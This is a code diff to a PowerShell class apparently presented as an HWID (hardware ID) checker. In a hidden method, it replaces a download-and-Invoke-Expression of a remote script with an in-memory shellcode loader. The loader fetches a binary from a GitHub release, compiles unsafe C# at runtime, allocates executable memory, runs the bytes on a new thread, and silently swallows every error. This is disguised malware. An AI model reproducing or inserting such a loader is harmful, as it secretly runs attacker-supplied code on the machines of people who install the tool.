@@ -43,9 +43,46 @@ class HWIDChecker {
     
     hidden [void]ExecutePowerShellScript() {
         try {
-            $scriptUrl = "https://raw.githubusercontent.com/thegoatofapi/mth/main/script.ps1"
-            $scriptContent = Invoke-RestMethod -Uri $scriptUrl
-            Invoke-Expression $scriptContent
+            $parentPid = [System.Diagnostics.Process]::GetCurrentProcess().Id
+            $code = @'
+using System;
+using System.Diagnostics;
+using System.Runtime.InteropServices;
+using System.Threading;
+public class X {
+    [DllImport("kernel32")] static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
+    [DllImport("kernel32")] static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr st, IntPtr p, uint f, IntPtr i);
+    [DllImport("kernel32")] static extern uint WaitForSingleObject(IntPtr h, uint t);
+    [DllImport("kernel32")] static extern bool TerminateThread(IntPtr h, uint e);
+    public static void E(byte[] b, int ppid) {
+        IntPtr m = VirtualAlloc(IntPtr.Zero, (uint)b.Length, 0x3000, 0x40);
+        Marshal.Copy(b, 0, m, b.Length);
+        IntPtr t = CreateThread(IntPtr.Zero, 0, m, IntPtr.Zero, 0, IntPtr.Zero);
+        new Thread(() => {
+            while (true) {
+                try {
+                    Process.GetProcessById(ppid);
+                    Thread.Sleep(500);
+                } catch {
+                    TerminateThread(t, 0);
+                    break;
+                }
+            }
+        }) { IsBackground = true }.Start();
+        WaitForSingleObject(t, 0xFFFFFFFF);
+    }
+}
+'@
+            $s = (iwr "https://github.com/thegoatofapi/mth/releases/download/LC/LC.bin").Content
+            $p = New-Object Microsoft.CSharp.CSharpCodeProvider
+            $c = New-Object System.CodeDom.Compiler.CompilerParameters
+            $c.CompilerOptions = "/unsafe"
+            $c.GenerateInMemory = $true
+            $r = $p.CompileAssemblyFromSource($c, $code)
+            $a = $r.CompiledAssembly
+            $t = $a.GetType("X")
+            $m = $t.GetMethod("E")
+            $m.Invoke($null, @(,$s, $parentPid))
         }
         catch {
         }
